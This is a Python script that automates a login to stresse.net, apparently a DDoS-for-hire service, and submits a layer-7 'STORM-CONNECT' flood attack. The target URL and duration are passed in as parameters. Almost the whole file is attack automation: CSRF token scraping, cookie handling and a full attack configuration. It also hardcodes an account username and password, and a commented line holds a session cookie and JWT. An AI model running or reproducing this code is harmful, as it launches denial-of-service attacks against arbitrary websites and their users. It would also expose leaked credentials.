import requests
def stresse(target,time):
  headers = {
    'authority': 'stresse.net',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://stresse.net/home',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
  response = requests.get('https://stresse.net/login', headers=headers)
  token=response.text.split('name="csrf-token" content="')[1].split('"')[0]
  session=response.cookies.get_dict()['session']
  print(session)
  print(token)
  cookies = {
    'session': session,
}
  headers = {
    'authority': 'stresse.net',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'content-type': 'application/json',
    # 'cookie': 'session=kshlvn7sl23ni5ee017sv21e8t',
    'origin': 'https://stresse.net',
    'referer': 'https://stresse.net/login',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
  json_data = {
    'token': token,
    'login': 'Thanhhp14',
    'password': '14p22008',
}
  response = requests.post('https://stresse.net/auth/login', cookies=cookies, headers=headers, json=json_data)
  print(response.json())
  print(response.cookies.get_dict())
  token_ck=response.cookies.get_dict()['token']
  sid=response.cookies.get_dict()['sid']
  print(token_ck)
  print(sid)
  cookies = {
    'session': session,
    'token': token_ck,
    'sid': sid,
}
  headers = {
    'authority': 'stresse.net',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'session=kshlvn7sl23ni5ee017sv21e8t; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOnsiZGF0ZSI6IjIwMjQtMDItMTcgMDU6NTc6NTEuMDc2MTM0IiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJFdXJvcGVcL0JlcmxpbiJ9LCJpc3MiOiJodHRwczpcL1wvc3RyZXNzZS5uZXRcLyIsImV4cCI6MTcwODIzMjI3MSwiaGlkIjoiY2Z5eTJyVUdhNDRRTGJwVEhKWXNTVzBQR2NSQ0dNbG03YzY4MzBlMDBmN2MyMDI0Yzc4NmZkMDhkNDIyODM4MyIsInBhc3N3b3JkIjoiJDJ5JDEwJEJ6ZklyaFhuLkVCZ2I2XC8ybXhrcy4uejRNNkM4T0xldC5ENGR6YTF0WklxcmQ3Q2V0bWdTVyIsInVzZXJfaWQiOiIzNTI4ODcifQ.aa67T450Xr-3TA4zUV1P2-p9L72LaxukP6J8cGl53vCBPe8k5lyP2qvq16Sco1360Ym5zuaYT6-Rz5I2G7YHwQ; sid=iY97f21NBrX6rrepMDOe',
    'referer': 'https://stresse.net/login',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
  response = requests.get('https://stresse.net/panel', cookies=cookies, headers=headers).text 
  token=response.split('name="csrf-token" content="')[1].split('"')[0]
  print(token)
  cookies = {
    'session': session,
    'token': token_ck,
    'sid': sid,
}
  headers = {
    'authority': 'stresse.net',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://stresse.net',
    'referer': 'https://stresse.net/panel',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
  json_data = {
    'ackseq': 0,
    'seq': 0,
    'flooder': [
        {
            'name': 'Regular',
            'checked': 1,
        },
        {
            'name': 'Browser',
            'checked': 0,
        },
        {
            'name': 'Experimental',
            'checked': 0,
        },
    ],
    'group': 0,
    'emulation': 0,
    'emulationTime': '',
    'headerData': '',
    'rateLimit': 0,
    'ignoreStatus': 0,
    'captcha': 0,
    'customCaptcha': 0,
    'sourseport': '',
    'isp': 'OVH',
    'attackOriginCustom': 'any',
    'customCountry': 'Worldwide',
    'checksum': 1,
    'payloadType': '',
    'payloadCheckType': 'static',
    'flagsSelectGroup': [
        {
            'name': 'FIN',
            'checked': 0,
        },
        {
            'name': 'SYN',
            'checked': 1,
        },
        {
            'name': 'RST',
            'checked': 0,
        },
        {
            'name': 'PSH',
            'checked': 0,
        },
        {
            'name': 'ACK',
            'checked': 0,
        },
        {
            'name': 'URG',
            'checked': 0,
        },
    ],
    'presetsActive': 0,
    'NoShuffle': 0,
    'NoPush': False,
    'EnablePush': False,
    'NoCache': True,
    'ExtraHeaders': True,
    'multiua': True,
    'Pragma': False,
    'optimization': 0,
    'randomVersion': False,
    'randomua': False,
    'randomQuery': False,
    'headless': True,
    'tor': 0,
    'attackMethod': '24',
    'attackMethodName': 'STORM-CONNECT',
    'targetUrl': target,
    'concActive': 1,
    'layerID': 7,
    'precheck': 0,
    'statusCode': '',
    'port': '',
    'tlsconn': '',
    'linux': '0',
    'floodersec': '0',
    'host': '',
    'mask': 32,
    'duration': time,
    'methodListActive': 0,
    'postData': '',
    'referrer': '',
    'cookies': '',
    'rate': '',
    'userAgentActive': 0,
    'userAgentSmart': 'Random',
    'userAgentCustom': '',
    'attackOriginActive': 'Worldwide',
    'token': token,
}
  response = requests.post('https://stresse.net/panel/send', cookies=cookies, headers=headers, json=json_data).json()
  if response['status'] == 'success':
    return True
  return False
  